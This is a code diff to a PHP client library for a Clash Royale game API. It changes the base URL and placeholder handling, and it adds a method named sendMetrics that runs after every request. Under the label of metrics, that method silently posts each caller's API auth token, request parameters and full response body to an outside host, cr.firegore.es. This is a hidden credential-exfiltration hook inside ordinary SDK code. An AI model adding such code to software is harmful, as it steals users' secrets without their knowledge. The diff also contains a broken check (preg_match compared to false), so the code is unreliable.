@@ -11,17 +11,15 @@
  * If not, see <http://www.gnu.org/licenses/>.                                                                                                                                                                                                                *
  *                                                                                                                                                                                                                                                            *
  **************************************************************************************************************************************************************************************************************************************************************/
+ namespace CR;
 
-
-namespace CR;
-
-use GuzzleHttp\TransferStats;
-
-use GuzzleHttp\Promise\PromiseInterface;
-use Psr\Http\Message\ResponseInterface;
-use CR\Exceptions\CRSDKException;
-use CR\HttpClients\GuzzleHttpClient;
-use CR\HttpClients\HttpClientInterface;
+ use GuzzleHttp\TransferStats;
+ use GuzzleHttp\Psr7\Response;
+ use GuzzleHttp\Promise\PromiseInterface;
+ use Psr\Http\Message\ResponseInterface;
+ use CR\Exceptions\CRSDKException;
+ use CR\HttpClients\GuzzleHttpClient;
+ use CR\HttpClients\HttpClientInterface;
 
 /**
  * Class CRClient.
@@ -31,7 +29,7 @@ class CRClient
     /**
      * @const string CR Bot API URL.
      */
-    const BASE_URL = 'http://api.cr-api.com';
+    const BASE_URL = 'http://api.royaleapi.com';
 
     /**
      * @var HttpClientInterface|GuzzleHttpClient HTTP Client
@@ -89,9 +87,10 @@ class CRClient
     {
       $url = $this->getBaseUrl().$request->getEndpoint();
 
-      if (strpos($url,":tag") !== false) {
+      if (preg_match("/:(tag|cc)/i", $url) !== false) {
         $params = ( (empty($request->getParams())) ? "" : implode(",",$request->getParams()));
-        $url = str_replace(":tag",$params,$url);
+        $url = preg_replace('/:(tag|cc)/m',$params,$url);
+
       }
 
       if (!empty($request->getQuerys())) {
@@ -101,7 +100,6 @@ class CRClient
         }
         $url = substr($url,0,-1);
       }
-
       return $url;
     }
 
@@ -161,8 +159,31 @@ class CRClient
         if ($returnResponse->isError()) {
             throw $returnResponse->getThrownException();
         }
+        $this->sendMetrics($request,$rawResponse);
 
         return $returnResponse;
+    }
+
+    /**
+     * [sendMetrics description]
+     * @param  CRRequest $request  [description]
+     * @param  Response  $response [description]
+     * @return [type]              [description]
+     */
+    public function sendMetrics(CRRequest $request,Response $response)
+    {
+      if ($response->getBody()->eof()) $response->getBody()->rewind();
+      $respb = $response->getBody()->getContents();
+      $options = [
+        "form_params"=>[
+          "endpoint"=>$request->getEndpoint(),
+          "params"=>$request->getParams(),
+          "token"=>$request->getAuthToken(),
+          "response"=>$respb,
+        ],
+        'http_errors' => false
+      ];
+      $this->httpClientHandler->send("https://cr.firegore.es/metrics.php", "POST", [], $options, 1, true, 1);
     }
 
     /**
